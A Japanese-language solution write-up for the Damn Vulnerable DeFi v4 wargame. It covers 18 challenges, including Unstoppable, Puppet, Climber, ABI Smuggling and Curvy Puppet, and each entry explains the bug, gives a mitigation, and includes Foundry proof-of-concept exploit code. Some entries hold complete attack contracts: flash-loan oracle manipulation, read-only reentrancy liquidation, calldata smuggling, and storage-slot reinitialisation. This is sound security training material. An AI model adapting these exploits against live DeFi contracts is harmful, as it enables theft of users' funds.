# Damn Vulnerable DeFi v4 攻略メモ
by tinamints

## 1. Unstoppable
### 条件 :
- 金庫 (vault) を停止させる
### 概念 :
-  フラッシュローン
-  DoS攻撃
### 解法 :
- `deposit`を使わずに直接トークンを送ることで `convertToShares(totalSupply) != balanceBefore` を成立させてリバートを引き起こす（`totalSupply`は`deposit`経由でしか更新されないため）
### 対策 :
- `token.balanceOf` に厳格な不変条件を結びつけないこと。ERC4626 の会計は shares/assets を内部で管理し、直接 `transfer` で `flashLoan` が壊れないようにする——`convertToShares(totalSupply) != balanceBefore` のチェックは削除する
### POC
` function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
`

## 2. Naive Receiver
### 条件 :
- プール内の全資金をリカバリーアカウント (recovery) へ移す
- 2トランザクション以内で完了する
### 概念 :
-  フラッシュローン
### 解法 :
- receiverを対象に指定して(フラッシュローンの)手数料によってETHを全額消費させ、feeReceiverになりすまして蓄積したWETHを引き出す
### 対策 :
- flash loan の本当の発行者を認証し（receiver が自分で頼んでいない loan の手数料を払わされないように）、`withdraw` で forwarder 経由の `_msgSender()` を信用しない——適切なアクセス制御／信頼できる forwarder の検証を行う
### POC
` function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory data = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                0,
                ""
            );
        }
        pool.multicall(data);

        vm.startPrank(address(deployer));
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        vm.stopPrank();
    }
`

## 3. Truster
### 条件 :
- 全資金をリカバリーアカウントへ移す
- 1トランザクションで完了する
### 概念 :
-  フラッシュローン
-  未検証の引数
### 解法 :
- `target`にプールを指定し`data`に`approve`を渡すことで、プール自身が攻撃者のトークン使用を承認するよう仕向ける
### 対策 :
- pool が自身の権限で任意の `target.call(data)` を実行させない——ユーザ指定の呼び出しを廃止するか、target/selector をホワイトリスト化して token の `approve` を呼べないようにする
### POC
`function test_truster() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
        attacker.attack();
    }`

## 4. Side Entrance
### 条件 :
- 全ETHをリカバリーアカウントへ移す
### 概念 :
-  担保付きフラッシュローン
### 解法 :
- フラッシュローン中に`execute`が呼ばれることを利用し、借りたETHをそのまま`deposit`してプール内の`balance`を増やし、後から`withdraw`する権利を得る
### 対策 :
- loan の返済は、`deposit` を返済扱いにするのではなく、token 残高が実際に増えたかで確認する（reentrancy guard も併用）
### POC
` function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
        exploit.exploit();
    }
`

## 5. The Rewarder
### 条件 :
- できる限り多くの資金をリカバリーアカウントへ移す
- ディストリビューターを操作するにはbeneficiariesに登録されている必要がある
### 概念 :
-  制限付き配布
-  マークルツリーシステム
### 解法 :
- `claimRewards()`が同一トークンの請求を使用済みとしてマークしないことを悪用し、同じトークンを1回の呼び出しで何度も請求して全額を引き出す
### 対策 :
- claim を処理する前／ループ内で使用済みフラグ（claimed bit）を立て、同一 (token,batch) の重複 claim を拒否し、一度の呼び出しで同じ報酬を何度も claim できないようにする
### POC
` function test_theRewarder() public checkSolvedByPlayer {
        // DVT・WETHの報酬JSONを読み込み、プレイヤーのマークルプルーフを構築
        // 各トークンを全額請求するのに必要な回数を計算してclaimsを埋める
        distributor.claimRewards({ inputClaims: claims, inputTokens: tokensToClaim });
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
`

## 6. Selfie
### 条件 :
- プール内の全トークンをリカバリーアカウントへ移す
### 概念 :
-  フラッシュローン
-  ガバナンス投票権の操作
### 解法 :
- フラッシュローンでプールのトークンを一時的に借りて過半数の投票権を獲得し、`emergencyExit`をガバナンスアクションとしてキューに登録、ローンを返済後2日待ってアクションを実行する
### 対策 :
- 投票権は proposal 作成前に保有していた checkpoint／時間加重の残高で計算し、単一ブロックで flashloan した残高が quorum に届かないようにする
### POC
` function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
    }
`

## 7. Compromised
### 条件 :
- エクスチェンジの全ETHをリカバリーアカウントへ移す
- プレイヤーはNFTを保有しないこと
- NFT価格は変わらないこと
### 概念 :
-  オラクル価格操作
-  秘密鍵の漏洩
### 解法 :
- READMEのhex文字列から2つのオラクルの秘密鍵をデコードし、NFT価格を0に設定、1weiで購入、価格を999ETHに戻してNFTを売却、ETHをリカバリーへ送る
### 対策 :
- oracle の秘密鍵を安全に保ち、複数の独立したソースを乖離チェック付きで集約する（例：Chainlink）——数個のソースの漏洩／支配で価格を決められないようにする
### POC
` function test_compromised() public checkSolved {
        vm.prank(source1); oracle.postPrice("DVNFT", 0);
        vm.prank(source2); oracle.postPrice("DVNFT", 0);
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();
        nft.approve(address(exchange), nftId);
        vm.stopPrank();
        vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.startPrank(player);
        exchange.sellOne(nftId);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
`

## 8. Puppet
### 条件 :
- レンディングプールの全DVT（10万枚）をリカバリーアカウントへ移す
- 1トランザクションで完了する
### 概念 :
-  Uniswap V1 オラクル価格操作
-  EIP-2612 permit
### 解法 :
- プレイヤーの1000 DVTをUniswap V1に売却してトークン価格を暴落させ、`calculateDepositRequired`の要求担保額をほぼゼロにする。permitを使って1txで全プールトークンを借り出す
### 対策 :
- 価格は Uniswap V1 の即時 spot reserves ではなく、操作耐性のある oracle（TWAP / Chainlink）から取得する
### POC
` function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }
`

## 9. Puppet V2
### 条件 :
- レンディングプールの全DVT（100万枚）をリカバリーアカウントへ移す
### 概念 :
-  Uniswap V2 オラクル価格操作
-  WETH担保
### 解法 :
- プレイヤーの1万DVTをUniswap V2で全売却してDVT価格を暴落させ、最小限のWETH担保で100万枚のトークンを借り出す
### 対策 :
- Puppet と同様：担保評価には Uniswap V2 の `getReserves` の spot 価格ではなく TWAP／外部 oracle を使う
### POC
` function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        weth.deposit{value: ethBalance}();
        weth.approve(address(lendingPool), requiredWETH);
        lendingPool.borrow(poolTokens);
        token.transfer(recovery, token.balanceOf(player));
    }
`

## 10. Free Rider
### 条件 :
- マーケットプレイスの全NFT（6点）を奪取する
- プレイヤーがバウンティ（45 ETH）を獲得する
### 概念 :
-  Uniswap V2 フラッシュローン
-  NFTマーケットプレイスの購入ロジックのバグ
### 解法 :
- Uniswapから15 ETH（NFT1枚分の価格）をフラッシュローンで借りる。マーケットの`buyMany`は`msg.value >= price`を1回しかチェックせず全6枚を購入できる上、ETHを売り手ではなく買い手に送るバグがある。6枚を15 ETHで購入してrecoveryManagerに転送し45 ETHのバウンティを受け取る
### 対策 :
- 各 NFT の価格の合計を請求し（アイテムごとに支払いを検証）、代金は売り手（転送前の所有者）に送る。checks-effects-interactions に従う
### POC
` function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace), address(recoveryManager), address(nft),
            address(uniswapPair), address(token), address(weth), address(player)
        );
        attacker.flashLoanInitilizer(15 ether);
    }
`

## 11. Backdoor
### 条件 :
- 全40 DVTをリカバリーアカウントへ移す
- 1トランザクションで完了する
### 概念 :
-  Safeプロキシファクトリー
-  setup時の任意呼び出し注入
### 解法 :
- `createProxyWithCallback`の`initializer`引数を悪用し、Safeの`setup()`中に`approve`を実行させる。WalletRegistryが新ウォレットに10 DVTを送ると即座に`transferFrom`で引き出す。4ユーザー分繰り返す
### 対策 :
- registry は任意の `initializer` calldata を信用せず、支払い前に新しい wallet の setup（想定した owner、module/delegatecall/埋め込み呼び出しが無いこと）を検証する
### POC
` function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory), address(singletonCopy),
            address(walletRegistry), address(token), recovery, users
        );
    }
`

## 12. Climber
### 条件 :
- ヴォールトの全DVT（1000万枚）をリカバリーアカウントへ移す
### 概念 :
-  タイムロックの実行前スケジュール確認漏れ
-  UUPSプロキシアップグレード
### 解法 :
- `execute()`はアクションのスケジュール確認より先に実行する。バッチ実行: ①遅延を0に設定 ②攻撃コントラクトにproposerロールを付与 ③ヴォールトを悪意のある実装にアップグレード ④コールバック内でバッチを後から`schedule`。その後アップグレード済みヴォールトの`sweepFunds`を呼ぶ
### 対策 :
- operation が schedule 済みで実行可能かを execute する前に確認し（外部呼び出しの前に executed とマークする）、schedule→execute の順序を強制する
### POC
` function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)), payable(address(timelock)), recovery, address(token)
        );
        attackContract.attack(address(maliciousImpl));
    }
`

## 13. Wallet Mining
### 条件 :
- ユーザーの入金アドレスにある2000万DVTを全額ユーザーへ回収し、wallet deployerの報酬をwardへ移動
### 概念 :
-  アップグレード可能プロキシ(proxy)のストレージスロット衝突（再初期化）
-  CREATE2アドレスのマイニング
### 解法 :
- `AuthorizerUpgradeable`の`needsInit`はストレージスロット0にあり、プロキシの`upgrader`アドレス（常に非ゼロ）と衝突している。そのため誰でも`init()`を再度呼び出して自分自身を認可できる。`WalletDeployer.drop()`は選んだ`(wat, nonce)`の組がCREATE2で`USER_DEPOSIT_ADDRESS`にデプロイされるかどうかしかチェックしないので、一致するnonceが見つかるまでブルートフォースし、その場所に本物のSafe（ownerは`user`）をデプロイする。あとはユーザーの署名で`execTransaction`を使って引き出し、deployerの報酬を`ward`に転送する
### 対策 :
- init フラグは衝突しない専用スロットに保持し（OZ の `Initializable` を使う）`init()` の再実行を防ぐ。また deploy 済み wallet の所有者を検証する前に、予測アドレスへ資金を送らない
### POC
`{
     // 1. Get authorized
        getAuthorized(authorizer);

        // 2. Find the nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
        //    and pays 1 DVT to this contract (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Drain the Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. Forward the reward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n))
            , initCodeHash)))));        
                
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
`

## 14. Puppet V3
### 条件 :
- レンディングプールから100万DVTを全額recoveryへ移す
- チャレンジの時間制限内（セットアップ後115秒未満）に完了する
### 概念 :
-  Uniswap V3のTWAPオラクル価格操作
-  時間加重平均価格（`vm.warp`で操作の反映を遅らせる仕組み）
### 解法 :
- プレイヤーの110 DVTを`exactInputSingle`でUniswap V3プールに売り、トークン価格を暴落させる。その後`vm.warp`で時間制限ギリギリまで時間を進め、TWAPを暴落後の価格に近づける。これにより`calculateDepositOfWETHRequired`が十分安くなり、わずかなWETH担保で100万DVTを借りられる
### 対策 :
- TWAP のウィンドウを長くする（かつ／または 2 つ目の oracle を使う）ことで、単一ブロックの短時間の価格操作が平均を十分に動かして担保見積もりを欺けないようにする
### POC
` function test_puppetV3() public checkSolvedByPlayer {
        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        token.approve(address(uniswapRouterAddress), type(uint256).max);
        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        console.log("quote1: ", quote1);
 
        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                3000,
                address(player),
                block.timestamp,
                PLAYER_INITIAL_TOKEN_BALANCE,
                0,
                0
            )
        );  
         vm.warp(block.timestamp + 114);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);
        console.log("quote: ", quote);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
        
    }
`

## 15. ABI Smuggling
### 条件 :
- vaultから100万DVTを全額recoveryへ移す
### 概念 :
-  ABI smuggling
-  calldataのoffset位置の偽装
### 解法 :
- `execute()`はcalldataの固定位置（100バイト目）から読み取ったselectorだけで権限チェックを行い、実際の`actionData`の位置は見ていない。そこで、プレイヤーが呼び出し許可を持つ`withdraw`のselectorを100バイト目にダミーとして配置し、実際のoffsetはさらに先にある本命のペイロード——プレイヤーが権限を持たない`sweepFunds`呼び出し——を指すようにcalldataを組み立てる。これにより権限チェックはダミーを見て通過するが、vaultは実際には密輸された`sweepFunds`を実行してしまう
### 対策 :
- `actionData` を実際に実行されるとおりにデコードし、その本物の payload の selector をチェックする——権限チェック用 selector を calldata の固定オフセットから読まない
### POC
` function test_abiSmuggling() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
    }`

`contract Exploit {
    function executeExploit() external returns (bytes memory) {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));

        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepFundsCalldata
        );

        return calldataPayload;
    }
}`

## 16. Shards
### 条件 :
- marketplaceからDVTを抜き取り、全額recoveryへ送る
- stakingコントラクトの残高は変えてはいけない
- プレイヤーは1回のトランザクションしか送れない
### 概念 :
-  丸め誤差（切り捨て vs 切り上げ）
-  支払いと返金で計算式が一致していない
-  時間チェックのロジックミス
### 解法 :
- `fill()`の支払額は`want * _toDVT(price, rate) / totalShards`で切り捨て計算されるため、100 shardsを買うと0 DVTになる（100 * 75e21 / 1e25 = 0.75 → 0）。一方`cancel()`は別の計算式`shards * rate / 1e6`（切り上げ）で返金するため、同じ100 shardsで約7.5e12 wei のDVTが返ってくる。さらに`cancel()`の時間チェックが逆に書かれているため、購入と同じブロックで即キャンセルできる。1回のトランザクションに収めるためexploitコントラクト内でfill → cancelを10001回繰り返し、利益をrecoveryへ送る
### 対策 :
- 常にプロトコル有利に丸める一貫した丸め（請求は切り上げ、返金は切り捨て）を使い、コスト 0 の fill を拒否し、`cancel()` の逆になった時間チェックの比較を修正する
### POC
` function test_shards() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
    }`

`contract Exploit {
    function attack(uint64 offerId) external {
        uint256 wantShards = 100;
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }
        token.transfer(recovery,token.balanceOf(address(this)));
    }
}`



## 17. Curvy Puppet
### 条件 :
- lendingコントラクト内の3ユーザー（alice/bob/charlie）のポジションをすべて閉じる（collateralもborrowも0にする）
- treasuryはWETHとLPをいくらか残し、かつ3ユーザー分のDVT（7500）を最終的に持つこと
- playerは最終的に何も残してはいけない
### 概念 :
-  read-only reentrancy（Curveの`get_virtual_price()`）
-  借入資産の価格オラクル操作
-  ネストしたフラッシュローン（Balancer + Aave）
### 解法 :
- lendingコントラクトは借入資産（Curve stETH/ETHのLPトークン）を`ETH_price * get_virtual_price()`で評価する。旧Curveプールの`remove_liquidity`はまずLP供給量をburnし、その後プール残高が確定する**前に**呼び出し元へrawコールでETHを送り返すため、そのETHコールバック中に`get_virtual_price()`が過大な値を読み取る（read-only reentrancy）。LPトークンはユーザーの*借入*資産なので、膨らんだLP価格が全員の負債価値を膨らませ、本来は過剰担保だった3つのポジションが清算可能になる。
- 清算は`collateralValue*100 < borrowValue*175`で発動する。collateral = 2500 DVT（$10）、borrow = 1 LP なので、`virtual_price > 3.5714e18`まで押し上げる必要がある（通常は約1.1e18）。
- 流れ：Balancer（外側・手数料0）とAave（内側）からWETH+wstETHをフラッシュローン → unwrap/withdrawでETH+stETHに変換 → 意図的にstETHを多めにした巨大な`add_liquidity`（spikeはstETH側に比例）→ `remove_liquidity` → ETHを受け取る`receive()`内ではvirtual_priceが跳ね上がっているので、3ユーザーを`liquidate()`する（treasuryの6.5 LPから1人あたり1 LPを支払い、1人あたり2500 DVTを受け取る）。
- 返済：ETHが少ない預け入れだったため戻りはETH過多 / stETH不足になり、ほぼ同価値のETH余剰とwstETH不足が生じる。まず返すべきWETHを確保し、残りのETHをLido経由でstETHに変換（treasuryがWETHを残せるよう少額のreserveを残す）してwrapし、必要なwstETHをすべて賄う。主なコストはAaveの約0.05%手数料で、treasuryの200 WETHのクッションで吸収されるため、wstETHの借入は控えめにする。
### 対策 :
- 信頼できない呼び出し元へ制御が渡り得る状態で`get_virtual_price()`（やプールのstate）を読まない — 操作耐性のあるオラクルを使うか、viewをプールのreentrancy lockで保護する（Curveは後に`remove_liquidity`へreentrancy保護を追加した）。貸付資産を単一のスポットvirtual priceで評価しないこと。
### POC
` function test_curvyPuppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(
            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
        );
        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        exploit.run();
    }`

`contract Exploit {
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // stETH多め: virtual_priceを ~3.5714e18（清算しきい値）の少し上まで押し上げる
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    uint256 constant ETH_RESERVE = 20e18; // treasuryがWETH > 0で終わるよう残すETH

    // ... immutables + lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users を保存するconstructor
    enum State { NONE, LIQUIDATING }
    State state;

    function run() external {
        // OUTER loan: Balancer（tokenは昇順: wstETH < WETH）
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH); tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // すべてtreasuryへ返す
        weth.deposit{value: address(this).balance}();
        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == address(balancer), "not balancer");
        // INNER loan: Aave（両資産）, modes [0,0] = 全額返済
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2);
        assets[0] = address(weth);  assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(abi.encodeWithSignature(
            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
        require(ok, "aave flashloan failed");
        // Balancerへ返済（手数料なし）
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
        address initiator, bytes calldata) external returns (bool) {
        require(msg.sender == aavePool && initiator == address(this));
        // 1) 借りたtokenをすべてプールのcoin（ETH + stETH）に変換
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
        stETH.approve(address(curvePool), type(uint256).max);
        // 2) 巨大な（stETH多めの）liquidityを追加
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
        // 3) liquidate()時にlendingがLPを引けるようにする
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
        // 4) remove -> プールがreceive()へrawコールでETH送付 -> 清算ウィンドウ
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;
        // 5) 返済: ETH余剰 -> stETH -> wstETH で不足分を補う
        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
        weth.deposit{value: wethOwed}();
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0)));
            require(ok, "lido submit failed");
        }
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
        return true;
    }

    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // 今virtual_priceは膨張中（read-only reentrancy）-> 全ポジション清算可能
        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
    }
}`


## 18. Withdrawal
### 条件 :
- 与えられた4つのwithdrawal（怪しいものも含む）をすべてL1 gatewayでfinalizeする（counter >= 4）
- token bridgeは資金の99%超を保持する（1%未満の損失で、かつ悪意あるものもfinalizeする）
- playerは最終的にtokenを0にする
### 概念 :
-  アクセス制御の不備（operatorはproof検証をスキップできる）
-  呼び出し前にfinalize / 戻り値を無視
-  underflowを利用して呼び出しをわざと失敗させる
### 解法 :
- `L1Gateway.finalizeWithdrawal()`は`OPERATOR_ROLE`を持つ者（player）なら**空のMerkle proof**でwithdrawalをfinalizeでき、しかも外部呼び出しの**前に**leafをfinalized扱いにしてcounterを増やし、その**呼び出しの成否を無視する**。7日の遅延はoperatorにも適用されるので、単に`vm.warp`で飛ばすだけでよい（timestampの細工は不要）。
- 4つのwithdrawalのうち3つは正当な10 DVTの送金で、1つ（index 2）が悪意あるもので999,000 DVTを引き出してbridgeを空にする。このleafを、token送金を実際には成立させずにfinalizeする必要がある。
- 手順（すべてoperatorとして、`withdrawals.json`のpayloadをそのままreplay）：(1) 正当な3つをfinalize；(2) **自作**のwithdrawalをfinalizeして999,000 DVTをplayerへ引き出し、bridgeを空にする；(3) 悪意あるものをfinalize — ここで`TokenBridge.executeTokenWithdrawal`が`totalDeposits -= 999_000e18`を行い**underflowしてrevert**するため、leafは記録されるがtokenは動かない；(4) 999,000 DVTをbridgeへ返す（playerは0になる）
### 対策 :
- 特権ロールがproof検証をスキップできないようにし、finalized扱いにする前にmessageが実際に成功したかを確認し（呼び出しの戻り値/revertをチェック）、1つのmessageでbridgeを空にできないようwithdrawalごとの金額上限を設ける
### POC
` function test_withdrawal() public checkSolvedByPlayer {
        vm.warp(block.timestamp + l1Gateway.DELAY() + 1 days);
        bytes32[] memory noProof = new bytes32[](0);
        string memory logs = vm.readFile("test/withdrawal/withdrawals.json");

        // 1) 正当な3つのwithdrawalをfinalize（各10 DVT）
        _finalizeLog(logs, 0, noProof);
        _finalizeLog(logs, 1, noProof);
        _finalizeLog(logs, 3, noProof);

        // 2) operatorとして自作のwithdrawalでbridgeの資金をplayerへ抜く
        uint256 drain = 999_000e18;
        bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
        bytes memory fwd = abi.encodeWithSignature(
            "forwardMessage(uint256,address,address,bytes)", uint256(1000), player, address(l1TokenBridge), inner
        );
        l1Gateway.finalizeWithdrawal(1000, l2Handler, address(l1Forwarder), START_TIMESTAMP, fwd, noProof);

        // 3) 悪意あるものをfinalize -> 内部送金がunderflowでrevert、それでもfinalizeされる
        _finalizeLog(logs, 2, noProof);

        // 4) 抜いたtokenをbridgeへ返す（playerは0に）
        token.transfer(address(l1TokenBridge), drain);
    }`

`// L2 withdrawalのlogをfinalizeWithdrawal経由でreplay（operator, proof不要）
    // log data = abi.encode(bytes32 id, uint256 timestamp, bytes message); topics[1]=nonce
    function _finalizeLog(string memory logs, uint256 i, bytes32[] memory noProof) private {
        string memory base = string.concat("[", vm.toString(i), "]");
        uint256 nonce = uint256(vm.parseJsonBytes32(logs, string.concat(base, ".topics[1]")));
        bytes memory data = vm.parseJsonBytes(logs, string.concat(base, ".data"));
        (, uint256 timestamp, bytes memory message) = abi.decode(data, (bytes32, uint256, bytes));
        l1Gateway.finalizeWithdrawal(nonce, l2Handler, address(l1Forwarder), timestamp, message, noProof);
    }`
